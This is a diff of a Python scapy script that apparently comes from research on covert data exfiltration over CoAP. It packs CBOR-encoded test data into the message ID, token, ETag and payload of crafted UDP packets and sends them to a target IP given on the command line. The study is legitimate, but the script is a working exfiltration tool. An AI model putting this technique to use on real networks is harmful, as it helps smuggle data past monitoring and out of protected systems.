@@ -2,11 +2,36 @@ import scapy.contrib.coap as CoAP
 from scapy.all import send, IP, UDP
 from util.cborctl import CBORIterator, readFromFile
 from hashlib import sha256
+import argparse, ipaddress, sys
 
-content = readFromFile("data_10mb.json")    # bytes von CBOR speichern
-print(type(content))
-print(len(content))
-print(sha256(content).hexdigest())
+
+parser = argparse.ArgumentParser()
+parser.add_argument("-l", "--Length", type=int, help = "Length of data to exfiltrate (1, 5, 10 MB)")
+parser.add_argument("-t", "--Target", help = "IP address of server to send exfiltration data to")
+args = parser.parse_args()
+
+size = int(args.Length)
+if size not in [1,5,10]:
+    print("Invalid exfiltration size!")
+    sys.exit(1)
+
+SERVER_IP = ""
+try:
+    ipaddress.ip_address(args.Target)
+except ValueError:
+    print("Invalid target server address!")
+    sys.exit(1)
+
+SERVER_IP = args.Target
+PSIZE = 1470
+
+print("\n====================CoAP EXFILTRATION====================\n")
+
+content = readFromFile(f"data_{size}mb.json")    # bytes von CBOR speichern
+#print(type(content))
+#print(len(content))
+print("Hash of CBOR-encoded content:\n" + sha256(content).hexdigest() + " (Check at receiver!)")
+print("Length of payload bytestream: " + str(len(content)) + "\n")
 
 # token max => 15
 # Max-Age => 4
@@ -23,14 +48,16 @@ POST_packet /= byte_data[20:]"""
 # normal 1472 -> wegen scapy bug + ETag ption = 1470
 itertor = CBORIterator(content)
 packet_counter = 0
-while itertor.getRemainingLength() >= 1470:
+print("START sending packets")
+
+while itertor.getRemainingLength() >= PSIZE:
     """x = CoAP.CoAP(code=1, msg_id=packet_counter+1, token=itertor.getNextBytes(15))
     x.options = [("ETag", itertor.getNextBytes(4)), ("Uri-Path", itertor.getNextBytes(1445))]"""
     x = CoAP.CoAP(code=2, msg_id=int.from_bytes(itertor.getNextBytes(2), "big"), token=itertor.getNextBytes(15), paymark=b'\xFF')
     x.options =  [("ETag", itertor.getNextBytes(4))]
     x /= itertor.getNextBytes(1447)
-    get = IP(dst="10.0.0.14") / UDP(dport=5683) / x
-    send(get)
+    get = IP(dst=SERVER_IP) / UDP(dport=5683) / x
+    send(get, verbose=False)
     packet_counter += 1
 
 """x = CoAP.CoAP(code=1, msg_id=int.from_bytes(content[:2], "big"), token=itertor.getNextBytes(15))
@@ -38,9 +65,12 @@ x.options = [("ETag", itertor.getNextBytes(4)), ("Uri-Path", itertor.getRemainin
 x = CoAP.CoAP(code=2, msg_id=int.from_bytes(itertor.getNextBytes(2), "big"), token=itertor.getNextBytes(15), paymark=b'\xFF')
 x.options =  [("ETag", itertor.getNextBytes(4))]
 x /= itertor.getRemainingBytes()
-get = IP(dst="10.0.0.14") / UDP(dport=5683) / x
-send(get)
+get = IP(dst=SERVER_IP) / UDP(dport=5683) / x
+send(get, verbose=False)
+print("FINISHED sending packets")
 packet_counter += 1
+print("Last packet length: " + str(len(x)))
+print("Last packet:")
 x.show()
 print("Packets sent: " + str(packet_counter))
-print("Size: " + str(len(content)))
+#print("Size: " + str(len(content)))
